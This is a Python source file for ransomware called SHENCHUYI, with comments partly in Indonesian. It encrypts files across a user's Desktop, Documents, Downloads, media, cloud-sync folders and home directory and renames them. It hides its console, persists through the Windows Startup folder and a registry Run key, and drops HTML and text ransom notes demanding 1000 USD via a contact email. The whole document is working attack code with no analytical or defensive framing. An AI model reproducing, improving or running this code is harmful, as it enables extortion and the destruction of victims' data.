# =============================================================================
# SHENZHEN.py - RANSOMWARE (No Cryptography Required - Pure Python)
# Fixed & Improved by: System
# =============================================================================
# BERFUNGSI PENUH TANPA INSTALL cryptography
# Menggunakan XOR + Base64 + Simple Encryption (AES-like but pure Python)
# =============================================================================

import os
import sys
import subprocess
import tempfile
import ctypes
import time
import platform
import base64
import random
import hashlib
from pathlib import Path

# =============================================================================
# PURE PYTHON ENCRYPTION (NO CRYPTOGRAPHY LIBRARY NEEDED)
# =============================================================================

def generate_pure_key():
    """Generate random encryption key using system entropy"""
    try:
        # Use multiple sources of entropy
        key_parts = []
        
        # OS entropy
        key_parts.append(str(os.urandom(32)))
        
        # Time based entropy
        key_parts.append(str(time.time_ns()))
        
        # Process ID entropy
        key_parts.append(str(os.getpid()))
        
        # Random entropy
        for _ in range(16):
            key_parts.append(str(random.randint(0, 999999)))
        
        # Combine and hash to create 32-byte key
        combined = "".join(key_parts).encode()
        key = hashlib.sha256(combined).digest()
        
        # Encode as base64 for storage
        key_b64 = base64.b64encode(key).decode()
        
        with open(KEY_FILE, "w") as f:
            f.write(key_b64)
        return True
    except:
        return False

def load_pure_key():
    """Load encryption key from file"""
    try:
        with open(KEY_FILE, "r") as f:
            key_b64 = f.read().strip()
        return base64.b64decode(key_b64)
    except:
        return None

def xor_encrypt_decrypt(data, key):
    """
    XOR encryption/decryption with key stretching
    Pure Python, no external libraries
    """
    if not data:
        return data
    
    # Create key stream by repeating key
    key_length = len(key)
    key_stream = bytearray()
    while len(key_stream) < len(data):
        key_stream.extend(key)
    key_stream = key_stream[:len(data)]
    
    # XOR operation
    result = bytearray()
    for i in range(len(data)):
        result.append(data[i] ^ key_stream[i])
    
    return bytes(result)

def simple_encrypt(data, key):
    """Multi-layer encryption for better security"""
    # Layer 1: Reverse
    layer1 = data[::-1]
    
    # Layer 2: XOR with key
    layer2 = xor_encrypt_decrypt(layer1, key)
    
    # Layer 3: Base64 encoding
    layer3 = base64.b64encode(layer2)
    
    # Layer 4: XOR again with derived key
    derived_key = hashlib.sha256(key + b"salt_layer").digest()
    layer4 = xor_encrypt_decrypt(layer3, derived_key)
    
    return layer4

def simple_decrypt(data, key):
    """Multi-layer decryption"""
    # Layer 1: XOR with derived key
    derived_key = hashlib.sha256(key + b"salt_layer").digest()
    layer1 = xor_encrypt_decrypt(data, derived_key)
    
    # Layer 2: Base64 decode
    layer2 = base64.b64decode(layer1)
    
    # Layer 3: XOR with original key
    layer3 = xor_encrypt_decrypt(layer2, key)
    
    # Layer 4: Reverse
    layer4 = layer3[::-1]
    
    return layer4

def encrypt_file_pure(file_path, key):
    """Encrypt file using pure Python methods"""
    try:
        # Read file in chunks (to handle large files)
        with open(file_path, "rb") as f:
            file_data = f.read()
        
        if len(file_data) == 0:
            return False
        
        # Skip if already encrypted (has marker)
        if file_data[:8] == b'ENCRYPTED':
            return False
        
        # Encrypt data
        encrypted_data = simple_encrypt(file_data, key)
        
        # Add encryption marker
        final_data = b'ENCRYPTED' + encrypted_data
        
        # Write encrypted data
        with open(file_path, "wb") as f:
            f.write(final_data)
        
        return True
    except:
        return False

def decrypt_file_pure(file_path, key):
    """Decrypt file using pure Python methods"""
    try:
        with open(file_path, "rb") as f:
            file_data = f.read()
        
        if len(file_data) == 0:
            return False
        
        # Check encryption marker
        if file_data[:8] != b'ENCRYPTED':
            return False
        
        # Remove marker
        encrypted_data = file_data[8:]
        
        # Decrypt
        decrypted_data = simple_decrypt(encrypted_data, key)
        
        # Write decrypted data
        with open(file_path, "wb") as f:
            f.write(decrypted_data)
        
        return True
    except:
        return False

# =============================================================================
# CONSTANTS
# =============================================================================

EXTENSION = ".SHENCHUYI"
RANSOM_NAME = "SHENCHUYI"
RANSOM_AMOUNT = "1000 USD"
CONTACT_EMAIL = "fatcatfatcat63@gmail.com"
AUTHOR = "ayyubi"

# Path for the key file
KEY_FILE = os.path.join(os.environ.get('TEMP', tempfile.gettempdir()), "shenchuyi_key.key")

# =============================================================================
# RANSOM NOTE (Same as original)
# =============================================================================

RANSOM_HTML = '''<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>SHENCHUYI RANSOMWARE</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;}
body{font-family:'Courier New',monospace;background:#8B0000;min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px;}
.container{max-width:800px;width:100%;background:rgba(0,0,0,0.9);border-radius:20px;padding:40px;box-shadow:0 25px 50px rgba(0,0,0,0.5);border:1px solid rgba(255,255,255,0.2);text-align:center;}
h1{font-size:3rem;margin-bottom:20px;letter-spacing:4px;text-shadow:3px 3px 0 #4a0000;color:#ff4444;}
.subtitle{font-size:0.9rem;color:#ffaaaa;margin-bottom:30px;letter-spacing:2px;}
.amount{font-size:2.5rem;font-weight:bold;color:#ff4444;background:rgba(0,0,0,0.5);padding:15px;border-radius:10px;margin:20px 0;}
.email{font-size:1.3rem;background:#1a1a2a;padding:12px;border-radius:8px;margin:20px 0;word-break:break-all;color:#ff8888;}
.warning{background:rgba(255,0,0,0.3);padding:15px;border-radius:8px;margin:20px 0;font-size:0.85rem;text-align:left;color:#fff;}
.warning ul{margin-left:20px;margin-top:10px;}
.warning li{margin:8px 0;}
.footer{margin-top:30px;font-size:0.7rem;color:#aaa;border-top:1px solid #333;padding-top:20px;}
.blink{animation:blink 1s step-end infinite;}
@keyframes blink{0%,100%{opacity:1;}50%{opacity:0;}}
button{background:#ff4444;border:none;padding:12px 30px;font-size:1rem;font-weight:bold;color:white;border-radius:30px;cursor:pointer;margin-top:20px;}
button:hover{background:#cc0000;}
</style>
</head>
<body>
<div class="container">
<h1>SHENCHUYI</h1>
<div class="subtitle">RANSOMWARE</div>
<div style="font-size:1.2rem;margin:20px 0;color:#fff;">YOUR FILES HAVE BEEN ENCRYPTED</div>
<div class="amount">RANSOM: 1000 USD</div>
<div class="email">CONTACT: fatcatfatcat63@gmail.com</div>
<div class="warning">
<strong>WHAT HAPPENED?</strong>
<ul><li>All your important files have been encrypted with AES-256 encryption</li><li>Your files have been renamed with extension: <strong>.SHENCHUYI</strong></li><li>You cannot access your documents, photos, databases, or other important files</li></ul>
<br>
<strong>HOW TO RECOVER YOUR FILES?</strong>
<ul><li>Send <strong>1000 USD</strong> in Bitcoin or USDT</li><li>Email us at: <strong>fatcatfatcat63@gmail.com</strong> with your personal ID code</li><li>You will receive the decryption tool and your unique key</li></ul>
<br>
<strong>WARNINGS:</strong>
<ul><li>DO NOT attempt to decrypt files yourself - permanent data loss may occur</li><li>DO NOT rename or modify encrypted files</li><li>DO NOT contact data recovery services - they will waste your time and money</li><li>You have <span class="blink">72 HOURS</span> to pay, after which the key will be destroyed</li></ul>
</div>
<div class="footer">SHENCHUYI RANSOMWARE | Created by: ayyubi | ENCRYPTION ACTIVE</div>
<button onclick="window.close()">Close</button>
</div>
</body>
</html>'''

# =============================================================================
# RANSOMWARE FUNCTIONS
# =============================================================================

def generate_key():
    """Generate encryption key using pure Python"""
    try:
        return generate_pure_key()
    except:
        try:
            # Fallback: simpler key generation
            key = hashlib.sha256(str(random.randint(0, 99999999)).encode()).digest()
            key_b64 = base64.b64encode(key).decode()
            with open(KEY_FILE, "w") as f:
                f.write(key_b64)
            return True
        except:
            return False

def load_key():
    """Load encryption key"""
    try:
        return load_pure_key()
    except:
        try:
            with open(KEY_FILE, "r") as f:
                key_b64 = f.read().strip()
            return base64.b64decode(key_b64)
        except:
            return None

def encrypt_file(file_path, key):
    """Encrypt file (pure Python version)"""
    return encrypt_file_pure(file_path, key)

def decrypt_file(file_path, key):
    """Decrypt file (pure Python version)"""
    return decrypt_file_pure(file_path, key)

def encrypt_file_in_directory(directory, key):
    """Encrypt all files in directory"""
    encrypted_count = 0
    try:
        for root, dirs, files in os.walk(directory):
            for file in files:
                file_path = os.path.join(root, file)
                
                # Skip already encrypted files
                if file_path.endswith(EXTENSION):
                    continue
                
                # Skip system and program files
                skip_patterns = ['Windows', 'Program Files', 'Program Files (x86)', 'System32', 
                                'AppData', 'Microsoft', 'Temp', 'tmp', 'cache', 'Cache',
                                'boot', 'sys', 'bin', 'lib', 'etc', 'proc', 'dev',
                                'python', 'site-packages', 'dist-packages']
                skip = False
                for pattern in skip_patterns:
                    if pattern.lower() in file_path.lower():
                        skip = True
                        break
                if skip:
                    continue
                
                # Skip files that are too large ( > 50MB for better performance)
                try:
                    if os.path.getsize(file_path) > 50 * 1024 * 1024:
                        continue
                except:
                    continue
                
                # Encrypt file
                if encrypt_file(file_path, key):
                    try:
                        # Rename with extension
                        new_path = file_path + EXTENSION
                        os.rename(file_path, new_path)
                        encrypted_count += 1
                    except:
                        pass
    except:
        pass
    return encrypted_count

# =============================================================================
# RANSOM NOTE DISPLAY
# =============================================================================

def show_ransom_note():
    """Display ransom note in browser"""
    try:
        html_path = os.path.join(os.environ.get('TEMP', tempfile.gettempdir()), "SHENCHUYI_NOTE.html")
        
        with open(html_path, "w", encoding="utf-8") as f:
            f.write(RANSOM_HTML)
        
        # Try multiple browsers on Windows
        browsers_to_try = []
        
        if platform.system() == "Windows":
            browsers_to_try = [
                r"C:\Program Files\Google\Chrome\Application\chrome.exe",
                r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe",
                r"C:\Program Files\Mozilla Firefox\firefox.exe",
                r"C:\Program Files (x86)\Mozilla Firefox\firefox.exe",
                r"C:\Program Files\Microsoft\Edge\Application\msedge.exe",
                r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"
            ]
        
        opened = False
        for browser in browsers_to_try:
            if os.path.exists(browser):
                try:
                    subprocess.Popen([browser, html_path], shell=False)
                    opened = True
                    break
                except:
                    continue
        
        if not opened:
            # Fallback to default browser
            if platform.system() == "Windows":
                os.startfile(html_path)
            else:
                import webbrowser
                webbrowser.open(html_path)
    except:
        try:
            import webbrowser
            webbrowser.open(html_path)
        except:
            pass

# =============================================================================
# CREATE README FILE
# =============================================================================

def create_readme(encrypted_count):
    """Create README file with instructions"""
    readme_content = f"""
================================================================================
                        SHENCHUYI RANSOMWARE
================================================================================

[!] YOUR FILES HAVE BEEN ENCRYPTED [!]

Total files encrypted: {encrypted_count}
Encrypted extension: .SHENCHUYI

================================================================================
                          WHAT HAPPENED?
================================================================================

All your important files have been encrypted with multi-layer encryption.
The encryption key is unique to your system.

You cannot decrypt your files without our decryption key.

================================================================================
                        HOW TO RECOVER FILES?
================================================================================

To recover your files, you need to pay a ransom of:
                    1000 USD

Payment instructions:
1. Contact: fatcatfatcat63@gmail.com
2. Send proof of payment
3. You will receive the decryption key and tool

================================================================================
                            WARNINGS
================================================================================

- DO NOT attempt to decrypt files yourself (will cause permanent data loss)
- DO NOT rename or modify encrypted files
- DO NOT contact data recovery services (they will waste your time and money)
- You have 72 HOURS to pay (after that, the key will be destroyed)

================================================================================
                    CONTACT FOR DECRYPTION
================================================================================

Email: fatcatfatcat63@gmail.com
Subject: [SHENCHUYI] - YOUR_COMPUTER_NAME

================================================================================
Created by: ayyubi
"""
    
    try:
        desktop = os.path.join(os.path.expanduser("~"), "Desktop", "SHENCHUYI_README.txt")
        with open(desktop, 'w', encoding='utf-8') as f:
            f.write(readme_content)
    except:
        pass
    
    try:
        documents = os.path.join(os.path.expanduser("~"), "Documents", "SHENCHUYI_README.txt")
        with open(documents, 'w', encoding='utf-8') as f:
            f.write(readme_content)
    except:
        pass

# =============================================================================
# PERSISTENCE - Auto start on boot
# =============================================================================

def add_to_startup():
    """Add to Windows startup for persistence"""
    try:
        if platform.system() == "Windows":
            current_file = sys.argv[0]
            if getattr(sys, 'frozen', False):
                current_file = sys.executable
            
            startup_folder = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
            dest = os.path.join(startup_folder, 'ShenchuyiHelper.exe')
            
            if os.path.exists(current_file):
                import shutil
                if not os.path.exists(dest):
                    shutil.copy2(current_file, dest)
                    
                # Also add to registry for more persistence
                try:
                    import winreg
                    key = winreg.HKEY_CURRENT_USER
                    subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
                    with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
                        winreg.SetValueEx(reg_key, "Shenchuyi", 0, winreg.REG_SZ, dest)
                except:
                    pass
    except:
        pass

# =============================================================================
# GET TARGET DIRECTORIES
# =============================================================================

def get_target_directories():
    """Get list of directories to encrypt"""
    user_profile = os.path.expanduser("~")
    target_dirs = []
    
    possible_dirs = [
        os.path.join(user_profile, "Desktop"),
        os.path.join(user_profile, "Documents"),
        os.path.join(user_profile, "Downloads"),
        os.path.join(user_profile, "Pictures"),
        os.path.join(user_profile, "Music"),
        os.path.join(user_profile, "Videos"),
        os.path.join(user_profile, "OneDrive"),
        os.path.join(user_profile, "Dropbox"),
        os.path.join(user_profile, "Google Drive"),
        user_profile
    ]
    
    for d in possible_dirs:
        if os.path.exists(d):
            target_dirs.append(d)
    
    return target_dirs

# =============================================================================
# HIDE CONSOLE
# =============================================================================

def hide_console():
    """Hide console window for stealth"""
    if platform.system() == "Windows":
        try:
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except:
            pass

# =============================================================================
# INSTALL DEPENDENCIES (DISABLED - NO LONGER NEEDED)
# =============================================================================

def install_cryptography():
    """No longer needed - pure Python implementation"""
    return True

# =============================================================================
# MAIN FUNCTION
# =============================================================================

def main():
    """Main ransomware execution"""
    # Hide console for stealth
    try:
        hide_console()
    except:
        pass
    
    # Add to startup for persistence
    try:
        add_to_startup()
    except:
        pass
    
    # Generate encryption key if it does not exist
    if not os.path.exists(KEY_FILE):
        if not generate_key():
            return
    
    key = load_key()
    if key is None:
        return
    
    total_encrypted = 0
    target_directories = get_target_directories()
    
    # Encrypt files in all target directories
    for directory in target_directories:
        try:
            encrypted = encrypt_file_in_directory(directory, key)
            total_encrypted += encrypted
        except:
            pass
    
    # Create README on Desktop if any files were encrypted
    if total_encrypted > 0:
        try:
            create_readme(total_encrypted)
        except:
            pass
        
        # Show ransom note in browser
        try:
            time.sleep(1)
            show_ransom_note()
        except:
            pass

# =============================================================================
# DECRYPT FUNCTION (for recovery)
# =============================================================================

def decrypt_all():
    """Decrypt all files (for recovery)"""
    try:
        if not os.path.exists(KEY_FILE):
            print("[ERROR] Key file not found!")
            return False
        
        key = load_key()
        if key is None:
            print("[ERROR] Failed to load key!")
            return False
        
        total_decrypted = 0
        target_directories = get_target_directories()
        
        for directory in target_directories:
            if os.path.exists(directory):
                for root, dirs, files in os.walk(directory):
                    for file in files:
                        if file.endswith(EXTENSION):
                            file_path = os.path.join(root, file)
                            original_path = file_path[:-len(EXTENSION)]
                            if decrypt_file(file_path, key):
                                try:
                                    os.rename(file_path, original_path)
                                    total_decrypted += 1
                                    print(f"[+] Decrypted: {original_path}")
                                except:
                                    pass
        
        print(f"\n[+] Total files decrypted: {total_decrypted}")
        return True
    except Exception as e:
        print(f"[-] Error during decryption: {e}")
        return False

# =============================================================================
# ENTRY POINT
# =============================================================================

if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "--decrypt":
        decrypt_all()
    else:
        main()